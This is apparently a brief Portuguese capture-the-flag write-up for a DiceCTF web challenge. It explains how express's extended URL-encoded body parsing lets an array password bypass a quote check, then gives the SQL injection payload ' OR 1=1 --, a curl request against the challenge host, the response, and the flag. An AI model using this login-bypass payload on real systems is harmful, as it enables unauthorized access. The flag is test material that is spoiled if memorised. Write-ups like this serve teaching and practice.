Basicamente esse app.use(bodyParser.urlencoded({ extended: true })) é o problema
Da pra vc passar um array na senha
e o includes não verifica o array
entao vc consegue mandar a aspas simples
username=admin&password[]=' or 1=1-- -
só mandar isso no POST

```
curl -L -X POST -d "username=admin&password[]=' OR 1=1 --;" missing-flavortext.dicec.tf/login
<!doctype html>
<html>
    <head>
        <link rel="stylesheet" href="/styles.css">
    </head>
    <body>
        <div>
            <p>Looks like there was no flavortext here either :(</p>
            <p>Here's your flag?</p>
            <p>dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}</p>
        </div>
    </body>
</html>
```

**Flag: dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}**